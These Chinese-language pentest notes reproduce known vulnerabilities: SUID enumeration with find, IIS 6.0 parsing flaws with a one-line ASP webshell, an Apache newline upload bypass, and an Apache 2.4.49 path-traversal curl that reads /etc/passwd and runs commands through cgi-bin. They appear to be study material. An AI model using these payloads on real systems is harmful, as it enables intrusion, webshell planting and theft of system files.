Windows系统漏洞微软的漏洞编号命名格式为：MS08067

SUID提权

以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。

find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;

这里以常见的find命令为例，来看一下如何使用find命令进行提权

find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。

其余一些命令的suid提权用法可以去该网站上查找https://gtfobins.org/

IIS 6.0 解析漏洞1

IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。

在网站下建立名为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都会被IIS当作asp文件来解析并执行。例如创建目录 vidun.asp，那么 /vidun.asp/1.jpg 将被当作 asp 文件来执行。

漏洞复现：

新建一个名为 test.asp 的目录，创建一个1.jpg的文件，文件内容如下：

<% response.write("hello world!") %>

IIS 6.0 解析漏洞2

同样是IIS 6.0 ，在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。

上传名为【test.asp;.jpg】的文件，虽然该文件真正的后缀名是【.jpg】,但因为文件名中含有特殊符号【;】，所以【;】后面的【.jpg】会直接忽略，只剩余【test.asp】被作为asp文件执行。

漏洞复现：

新建一个名为 webshell.asp;.jpg 的文件，文件内容如下：

<%eval request("pass")%>

CVE-2017-15715 换行解析漏洞

Apache HTTPD是一款HTTP服务器，它可以通过 mod_php 来运行PHP网页。其 2.4.0~2.4.29 版本中存在一个解析漏洞，在解析PHP时，1.php\x0A 将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。

漏洞利用局限性：

获取文件名时不能用 $_FILES['file']['name']，因为他会自动把换行去掉，所以漏洞复现靶机设置保存的文件名为自定义。

漏洞复现：

上传 shell.php文件是使用BurpSuite抓包，修改后缀，使用BurpSuite中的hex功能手动添加 0a 换行符号，发送数据包后在原始路径下添加 %0a 访问上传的文件。

CVE-2021-41773/42013 路径穿越漏洞

Apache在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：

• 版本等于2.4.49

• 穿越的目录允许被访问，比如配置了Require all granted。（默认情况下是不允许的）

攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了 cgi 或 cgid 的服务器上执行任意命令。

漏洞复现：

curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

注：其中的 /icons/ 必须是一个存在且可访问的目录

在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：

http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh

post：echo;id
